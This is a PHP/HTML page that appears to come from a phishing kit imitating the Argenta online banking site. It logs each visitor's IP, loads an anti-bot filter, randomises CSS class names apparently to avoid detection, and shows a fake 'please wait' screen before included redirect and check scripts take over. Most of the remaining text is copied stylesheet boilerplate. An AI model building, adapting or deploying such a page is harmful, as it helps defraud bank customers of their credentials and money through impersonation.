<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page Loading";
    get_page_info($get_name_page, $get_name_file);

    $rendom_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<html class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> bd-designMode-null webkit modzr-getrandomvalues modzr-flexbox modzr-cssscrollbar modzr-smil" dir="ltr" xmlns:lp="http://launchpad.backbase.com" xmlns:ng="http://angularjs.org">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            svg:not(:root).svg-inline--fa {
                overflow: visible;
            }
            .svg-inline--fa {
                display: inline-block;
                font-size: inherit;
                height: 1em;
                overflow: visible;
                vertical-align: -0.125em;
            }
            .svg-inline--fa.fa-lg {
                vertical-align: -0.225em;
            }
            .svg-inline--fa.fa-w-1 {
                width: 0.0625em;
            }
            .svg-inline--fa.fa-w-2 {
                width: 0.125em;
            }
            .svg-inline--fa.fa-w-3 {
                width: 0.1875em;
            }
            .svg-inline--fa.fa-w-4 {
                width: 0.25em;
            }
            .svg-inline--fa.fa-w-5 {
                width: 0.3125em;
            }
            .svg-inline--fa.fa-w-6 {
                width: 0.375em;
            }
            .svg-inline--fa.fa-w-7 {
                width: 0.4375em;
            }
            .svg-inline--fa.fa-w-8 {
                width: 0.5em;
            }
            .svg-inline--fa.fa-w-9 {
                width: 0.5625em;
            }
            .svg-inline--fa.fa-w-10 {
                width: 0.625em;
            }
            .svg-inline--fa.fa-w-11 {
                width: 0.6875em;
            }
            .svg-inline--fa.fa-w-12 {
                width: 0.75em;
            }
            .svg-inline--fa.fa-w-13 {
                width: 0.8125em;
            }
            .svg-inline--fa.fa-w-14 {
                width: 0.875em;
            }
            .svg-inline--fa.fa-w-15 {
                width: 0.9375em;
            }
            .svg-inline--fa.fa-w-16 {
                width: 1em;
            }
            .svg-inline--fa.fa-w-17 {
                width: 1.0625em;
            }
            .svg-inline--fa.fa-w-18 {
                width: 1.125em;
            }
            .svg-inline--fa.fa-w-19 {
                width: 1.1875em;
            }
            .svg-inline--fa.fa-w-20 {
                width: 1.25em;
            }
            .svg-inline--fa.fa-pull-left {
                margin-right: 0.3em;
                width: auto;
            }
            .svg-inline--fa.fa-pull-right {
                margin-left: 0.3em;
                width: auto;
            }
            .svg-inline--fa.fa-border {
                height: 1.5em;
            }
            .svg-inline--fa.fa-li {
                width: 2em;
            }
            .svg-inline--fa.fa-fw {
                width: 1.25em;
            }
            .fa-layers svg.svg-inline--fa {
                bottom: 0;
                left: 0;
                margin: auto;
                position: absolute;
                right: 0;
                top: 0;
            }
            .fa-layers {
                display: inline-block;
                height: 1em;
                position: relative;
                text-align: center;
                vertical-align: -0.125em;
                width: 1em;
            }
            .fa-layers svg.svg-inline--fa {
                -webkit-transform-origin: center center;
                transform-origin: center center;
            }
            .fa-layers-counter,
            .fa-layers-text {
                display: inline-block;
                position: absolute;
                text-align: center;
            }
            .fa-layers-text {
                left: 50%;
                top: 50%;
                -webkit-transform: translate(-50%, -50%);
                transform: translate(-50%, -50%);
                -webkit-transform-origin: center center;
                transform-origin: center center;
            }
            .fa-layers-counter {
                background-color: #ff253a;
                border-radius: 1em;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                color: #fff;
                height: 1.5em;
                line-height: 1;
                max-width: 5em;
                min-width: 1.5em;
                overflow: hidden;
                padding: 0.25em;
                right: 0;
                text-overflow: ellipsis;
                top: 0;
                -webkit-transform: scale(0.25);
                transform: scale(0.25);
                -webkit-transform-origin: top right;
                transform-origin: top right;
            }
            .fa-layers-bottom-right {
                bottom: 0;
                right: 0;
                top: auto;
                -webkit-transform: scale(0.25);
                transform: scale(0.25);
                -webkit-transform-origin: bottom right;
                transform-origin: bottom right;
            }
            .fa-layers-bottom-left {
                bottom: 0;
                left: 0;
                right: auto;
                top: auto;
                -webkit-transform: scale(0.25);
                transform: scale(0.25);
                -webkit-transform-origin: bottom left;
                transform-origin: bottom left;
            }
            .fa-layers-top-right {
                right: 0;
                top: 0;
                -webkit-transform: scale(0.25);
                transform: scale(0.25);
                -webkit-transform-origin: top right;
                transform-origin: top right;
            }
            .fa-layers-top-left {
                left: 0;
                right: auto;
                top: 0;
                -webkit-transform: scale(0.25);
                transform: scale(0.25);
                -webkit-transform-origin: top left;
                transform-origin: top left;
            }
            .fa-lg {
                font-size: 1.3333333333em;
                line-height: 0.75em;
                vertical-align: -0.0667em;
            }
            .fa-xs {
                font-size: 0.75em;
            }
            .fa-sm {
                font-size: 0.875em;
            }
            .fa-1x {
                font-size: 1em;
            }
            .fa-2x {
                font-size: 2em;
            }
            .fa-3x {
                font-size: 3em;
            }
            .fa-4x {
                font-size: 4em;
            }
            .fa-5x {
                font-size: 5em;
            }
            .fa-6x {
                font-size: 6em;
            }
            .fa-7x {
                font-size: 7em;
            }
            .fa-8x {
                font-size: 8em;
            }
            .fa-9x {
                font-size: 9em;
            }
            .fa-10x {
                font-size: 10em;
            }
            .fa-fw {
                text-align: center;
                width: 1.25em;
            }
            .fa-ul {
                list-style-type: none;
                margin-left: 2.5em;
                padding-left: 0;
            }
            .fa-ul > li {
                position: relative;
            }
            .fa-li {
                left: -2em;
                position: absolute;
                text-align: center;
                width: 2em;
                line-height: inherit;
            }
            .fa-border {
                border: solid 0.08em #eee;
                border-radius: 0.1em;
                padding: 0.2em 0.25em 0.15em;
            }
            .fa-pull-left {
                float: left;
            }
            .fa-pull-right {
                float: right;
            }
            .fa.fa-pull-left,
            .fab.fa-pull-left,
            .fal.fa-pull-left,
            .far.fa-pull-left,
            .fas.fa-pull-left {
                margin-right: 0.3em;
            }
            .fa.fa-pull-right,
            .fab.fa-pull-right,
            .fal.fa-pull-right,
            .far.fa-pull-right,
            .fas.fa-pull-right {
                margin-left: 0.3em;
            }
            .fa-spin {
                -webkit-animation: fa-spin 2s infinite linear;
                animation: fa-spin 2s infinite linear;
            }
            .fa-pulse {
                -webkit-animation: fa-spin 1s infinite steps(8);
                animation: fa-spin 1s infinite steps(8);
            }
            @-webkit-keyframes fa-spin {
                0% {
                    -webkit-transform: rotate(0);
                    transform: rotate(0);
                }
                100% {
                    -webkit-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            @keyframes fa-spin {
                0% {
                    -webkit-transform: rotate(0);
                    transform: rotate(0);
                }
                100% {
                    -webkit-transform: rotate(360deg);
                    transform: rotate(360deg);
                }
            }
            .fa-rotate-90 {
                -webkit-transform: rotate(90deg);
                transform: rotate(90deg);
            }
            .fa-rotate-180 {
                -webkit-transform: rotate(180deg);
                transform: rotate(180deg);
            }
            .fa-rotate-270 {
                -webkit-transform: rotate(270deg);
                transform: rotate(270deg);
            }
            .fa-flip-horizontal {
                -webkit-transform: scale(-1, 1);
                transform: scale(-1, 1);
            }
            .fa-flip-vertical {
                -webkit-transform: scale(1, -1);
                transform: scale(1, -1);
            }
            .fa-flip-both,
            .fa-flip-horizontal.fa-flip-vertical {
                -webkit-transform: scale(-1, -1);
                transform: scale(-1, -1);
            }
            :root .fa-flip-both,
            :root .fa-flip-horizontal,
            :root .fa-flip-vertical,
            :root .fa-rotate-180,
            :root .fa-rotate-270,
            :root .fa-rotate-90 {
                -webkit-filter: none;
                filter: none;
            }
            .fa-stack {
                display: inline-block;
                height: 2em;
                position: relative;
                width: 2.5em;
            }
            .fa-stack-1x,
            .fa-stack-2x {
                bottom: 0;
                left: 0;
                margin: auto;
                position: absolute;
                right: 0;
                top: 0;
            }
            .svg-inline--fa.fa-stack-1x {
                height: 1em;
                width: 1.25em;
            }
            .svg-inline--fa.fa-stack-2x {
                height: 2em;
                width: 2.5em;
            }
            .fa-inverse {
                color: #fff;
            }
            .sr-only {
                border: 0;
                clip: rect(0, 0, 0, 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                position: absolute;
                width: 1px;
            }
            .sr-only-focusable:active,
            .sr-only-focusable:focus {
                clip: auto;
                height: auto;
                margin: 0;
                overflow: visible;
                position: static;
                width: auto;
            }
            .svg-inline--fa .fa-primary {
                fill: var(--fa-primary-color, currentColor);
                opacity: 1;
                opacity: var(--fa-primary-opacity, 1);
            }
            .svg-inline--fa .fa-secondary {
                fill: var(--fa-secondary-color, currentColor);
                opacity: 0.4;
                opacity: var(--fa-secondary-opacity, 0.4);
            }
            .svg-inline--fa.fa-swap-opacity .fa-primary {
                opacity: 0.4;
                opacity: var(--fa-secondary-opacity, 0.4);
            }
            .svg-inline--fa.fa-swap-opacity .fa-secondary {
                opacity: 1;
                opacity: var(--fa-primary-opacity, 1);
            }
            .svg-inline--fa mask .fa-primary,
            .svg-inline--fa mask .fa-secondary {
                fill: #000;
            }
            .fad.fa-inverse {
                color: #fff;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>

        <link rel="stylesheet" href="./home/font-awesome.min.css" />

        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <title>Argenta Internetbankieren</title>
        <link href="./home/reset.css" rel="stylesheet" type="text/css" />
        <link href="./home/backbase-portal.css" rel="stylesheet" type="text/css" />
        <link href="./home/all.css" rel="stylesheet" type="text/css" />
        <link href="./home/aurora.min.css" rel="stylesheet" type="text/css" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
        <link href="./favicon.png" rel="icon" />
        <link href="./home/base-2.css" rel="stylesheet" type="text/css" />
        <link href="./home/base.css" rel="stylesheet" type="text/css" />
        <link href="./home/base-1.css" rel="stylesheet" type="text/css" />
        <link href="./home/footer.css" rel="stylesheet" type="text/css" />
        <link href="./home/page-layout.css" rel="stylesheet" type="text/css" />
        <link href="./home/deck-container.css" rel="stylesheet" type="text/css" />
        <link href="./home/launcher-container.css" rel="stylesheet" type="text/css" />
        <link href="./home/panel-container.css" rel="stylesheet" type="text/css" />
        <link href="./home/advanced-content-template.css" rel="stylesheet" type="text/css" />
        <link href="./home/content-accordion.css" rel="stylesheet" type="text/css" />
        <link href="./home/notifications.css" rel="stylesheet" type="text/css" />
        <link href="./home/navbar-advanced.css" rel="stylesheet" type="text/css" />
        <style>
            .lp-page-children .bp-container {
                z-index: auto;
            }
        </style>
        
    </head>

    <body ng-app="app" ng-controller="c1" ng-model-options="{&#39;allowInvalid&#39;:true}" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> ng-scope" style="overflow: auto;">
        <div id="skip-link" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> skip-link"></div>

        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> pageContainer ag-white-background">
            <center>
                <div id="main" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> bp-page bp-portal-area">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> lp-page-children bp-area --area">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> loader__ waiter__" style="">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> loader-box">
                                <h2 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> waiter_h2">Wacht alsjeblieft...</h2>
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> loader-images-box">
                                    <img class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> newloader" src="./home/newloader.gif" height="50" />
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> ab-logo">
                                        <img
                                            class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> loader-logo"
                                            src="data:image/png;base64,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"
                                        />
                                    </div>
                                </div>
                                <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $rendom_classes;?> waiter_p">Laad deze pagina niet opnieuw</p>
                            </div>
                        </div>
                    </div>
                </div>
            </center>
        </div>

        <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
   
       
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?> 
    </body>
</html>
